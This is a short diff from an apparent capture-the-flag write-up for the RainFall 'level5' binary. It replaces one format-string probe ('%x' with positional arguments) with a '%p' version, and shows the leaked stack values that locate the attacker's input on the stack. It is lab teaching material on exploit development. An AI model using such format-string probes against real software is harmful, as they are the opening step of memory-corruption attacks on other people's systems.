@@ -77,8 +77,8 @@ End of assembler dump.
 In short, as we see in the exit function here, we are calling an entry in a ‘trampoline’ or ‘redirect’ table called @plt (Procedure Linkage Table). We are using the **jmp** memory address.
 
 ```
-level5@RainFall:~$ echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x.%5\$x" | ./level5
-AAAA200.b7fd1ac0.b7ff37d0.41414141.78243125
+level5@RainFall:~$ echo "AAAA %p %p %p %p %p %p %p %p %p" | ./level5
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
 ```
 
 ```diff
